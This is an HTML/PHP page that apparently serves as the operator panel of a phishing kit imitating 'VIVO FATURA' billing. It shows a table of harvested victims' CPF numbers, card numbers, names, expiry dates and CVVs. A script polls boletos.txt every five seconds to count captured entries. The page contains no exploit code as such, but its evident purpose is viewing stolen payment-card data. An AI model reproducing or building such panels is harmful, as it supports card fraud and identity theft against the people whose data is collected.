<!DOCTYPE html>
<html>
<head>
    <title>Painel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.1.1/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/bs5/jszip-2.5.0/dt-1.11.3/b-2.0.1/b-colvis-2.0.1/b-html5-2.0.1/r-2.2.9/sl-1.3.3/datatables.min.css"/>
    <link rel="stylesheet" type="text/css" href="style.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/1.10.25/css/dataTables.bootstrap5.min.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/buttons/1.7.1/css/buttons.bootstrap5.min.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/select/1.3.3/css/select.bootstrap5.min.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/responsive/2.2.9/css/responsive.bootstrap5.min.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/datetime/1.1.1/css/dataTables.dateTime.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootswatch/5.2.2/darkly/bootstrap.min.css">
</head>
<body>
<div class="container-fluid bg-dark text-white py-3">
    <h1 class="text-center">VIVO FATURA</h1>
    <div class="float-end">
        <button class="btn btn-primary me-3" id="kkkk">Total Boletos: <label id="count"></label></button>
        <button class="btn btn-primary me-3" id="btnConfigurar">Configurar</button>
        <button class="btn btn-danger">Deslogar</button>
    </div>
</div>

<div class="container py-5">
    <table class="table table-striped" id="minha-tabela">
        <thead>
            <tr>
                <th>CPF</th>
                <th>CARTÃO</th>
                <th>NOME</th>
                <th>VALIDADE</th>
                <th>CVV</th>
                <th>EXCLUIR</th>
            </tr>
        </thead>
        <tbody>
        </tbody>
    </table>
    <div id="pagination-container"></div>
</div>

<!-- Modal -->
<div class="modal fade" id="configurarModal" tabindex="-1" aria-labelledby="configurarModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-fullscreen">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="configurarModalLabel">Configurar</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        <iframe id="configurarIframe" width="100%" height="100%" frameborder="0"></iframe>
      </div>
    </div>
  </div>
</div>


    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.1.1/js/bootstrap.bundle.min.js"></script>
    <script type="text/javascript" src="https://cdn.datatables.net/v/bs5/jszip-2.5.0/dt-1.11.3/b-2.0.1/b-colvis-2.0.1/b-html5-2.0.1/r-2.2.9/sl-1.3.3/datatables.min.js"></script>
    <script src="script.js?_=<?php echo rand();?>"></script>
    <script>
		function countLines() {
			var file = "boletos.txt?=ddd";
			var xhr = new XMLHttpRequest();
			xhr.open("GET", file, true);
			xhr.onreadystatechange = function() {
				if (xhr.readyState === 4 && xhr.status === 200) {
					var lines = xhr.responseText.split("\n");
					var count = 0;
					for (var i = 0; i < lines.length; i++) {
						if (lines[i].trim() !== "") {
							count++;
						}
					}
					document.getElementById("count").innerHTML = count;
				}
			};
			xhr.send();
		}

		// Chama a função countLines a cada 5 segundos
		setInterval(countLines, 5000); // 5000 milissegundos = 5 segundos
	</script>
</body>
</html>
